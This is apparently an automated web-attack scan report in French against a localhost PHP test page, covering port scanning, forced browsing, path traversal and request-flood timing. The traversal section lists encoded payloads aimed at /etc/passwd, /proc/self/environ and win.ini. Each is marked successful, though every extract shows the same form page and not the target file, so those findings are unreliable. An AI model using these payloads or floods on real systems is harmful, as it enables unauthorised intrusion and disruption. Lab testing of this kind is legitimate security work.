# Rapport des Attaques

## Analyse de l'attaque Nmap :
URL cible : localhost

Résultats du scan :
Ports ouverts : 80

## Analyse de l'attaque Buffer Overflow pour : http://localhost/csrf.php
Payload envoyé (100 octets).
Réponse du serveur : 200
ID de session : r54upaqk5cdolg3ucnkjtkk09g<br>Utilisateur  introuvable.
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisat...


## Analyse de l'attaque Access Control :
- Accessible: http://localhost/csrf.php/admin (200 OK)
- Accessible: http://localhost/csrf.php/settings (200 OK)
- Accessible: http://localhost/csrf.php/hidden (200 OK)
- Accessible: http://localhost/csrf.php/api (200 OK)
- Accessible: http://localhost/csrf.php/dashboard (200 OK)
- Accessible: http://localhost/csrf.php/config (200 OK)
- Accessible: http://localhost/csrf.php/login (200 OK)
- Accessible: http://localhost/csrf.php/logout (200 OK)
- Accessible: http://localhost/csrf.php/register (200 OK)
- Accessible: http://localhost/csrf.php/backup (200 OK)
- Accessible: http://localhost/csrf.php/data (200 OK)
- Accessible: http://localhost/csrf.php/private (200 OK)
- Accessible: http://localhost/csrf.php/secure (200 OK)
- Accessible: http://localhost/csrf.php/test (200 OK)


## Analyse des Composants Vulnérables

URL cible : http://localhost/csrf.php
### Composants détectés :
- **PHP**: 2.4.54

### Frameworks détectés :
- **Backend Framework**: PHP/7.4.33

### Vérification des vulnérabilités :

#### PHP:
PHP: Pas de vulnérabilités connues

#### Backend Framework:
Backend Framework: Pas de vulnérabilités connues
## Path Traversal

URL cible : http://localhost/csrf.php
- Fichier cible : /etc/passwd
- Fichier cible : /etc/hosts
- Fichier cible : /windows/win.ini
- Fichier cible : /proc/self/environ
- Pattern de traversée : ../
- Pattern de traversée :  ..\
- Pattern de traversée :  ..%2f
- Pattern de traversée :  ..%5c
- Pattern de traversée :  ..%c0%af
- Pattern de traversée :  ..%u2216
- Pattern de traversée :  ..%252e%252e%255c

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file=..//etc/passwd
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : u85vvprk53b5ledi2rqr0vopsg<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..\/etc/passwd
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 87b5i8ni2630vm5825ep3ku5l1<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%2f/etc/passwd
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 5mq9rot7qlvri75nf7uukev05o<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%5c/etc/passwd
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : r802gqltgo9pjrukj552h48qpa<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%c0%af/etc/passwd
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : kfthu3mbkvhqukt1hl8308p4ba<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%u2216/etc/passwd
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : ljsmh28k3ibdurscb0f221u8b2<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%252e%252e%255c/etc/passwd
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : kiqjmfa7s893kpaiba2b5fkgo5<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file=..//etc/hosts
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : r16hjvh6big5l9lm8aahrq2hcp<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..\/etc/hosts
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : hes9ou363flo4n6a1vak5rlcm2<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%2f/etc/hosts
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 5d4kboc2eqp30k21m1domju1o3<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%5c/etc/hosts
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 0db5oa9ai48v2tbjj15kn1s5rs<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%c0%af/etc/hosts
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 7hftig529709gqtrfj00fff618<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%u2216/etc/hosts
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : n8bn3viodtiim0gmaiq53camfb<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%252e%252e%255c/etc/hosts
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : gr446t2mn5900r43lu7hb9hfgb<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file=..//windows/win.ini
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : k7g3kjvsq6377f70dv1r70f62b<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..\/windows/win.ini
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : fujpgrsnijrad9k59u8f6qlmn3<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%2f/windows/win.ini
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : c64v8l2u447ec0m6fbiedhhk6f<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%5c/windows/win.ini
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : vk6r8jqje83prul2i4rsqjipjr<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%c0%af/windows/win.ini
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 2g62bghgv9vh21je63j9u91ttq<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%u2216/windows/win.ini
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 3s8t23s298dps7f04g4oop8l8o<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%252e%252e%255c/windows/win.ini
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : p0n051ut9fq5eac698q73d59rt<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file=..//proc/self/environ
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : bkd27i0qucupbmk4eus29n8l42<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..\/proc/self/environ
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : bmpoi9s7d42020hpnf1kmlj41s<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%2f/proc/self/environ
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : v06hmodqrjp2iod81l1dja8r7q<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%5c/proc/self/environ
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : 0a6ht9fgda4d8d93mpejkst19e<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%c0%af/proc/self/environ
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : rh3r2svjulk5kdkhpd2ql6a5pa<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%u2216/proc/self/environ
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : j79tu75mr846rib9t9cap1skgd<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

[SUCCESS] Fichier trouvé : http://localhost/csrf.php?file= ..%252e%252e%255c/proc/self/environ
<details>
<summary>Voir le contenu extrait</summary>

```
ID de session : fi436lg2cqr6q2pfqqqubp79pv<br>
<!-- Formulaire vulnérable -->
<form method="POST" action="">
    <input type="text" name="username" placeholder="Nom d'utilisateur">
    <input type="password" name="password" placeholder="Nouveau mot de passe">
    <button type="submit">Soumettre</button>
</form>

<!-- Afficher les utilisateurs stockés dans la session -->
<h3>Utilisateurs enregistrés dans la session :</h3>
<pre>Array
(
    [alice] => password123
    [bob] => securePass
)
</pre>


```
</details>

## Analyse de l'attaque DDoS
- URL cible : http://localhost/csrf.php
- Temps initial estimé : 10.00 secondes
- Temps réel de l'attaque : 10.35 secondes
- Nombre de requêtes sélectionnées : 100
- Requêtes effectuées : 100
- Intervalle entre les requêtes : 0.10 secondes


## Analyse de l'attaque ICMP DDoS
Durée totale : 12.33 secondes
Nombre total de requêtes : 100
Requêtes par seconde : 8.11


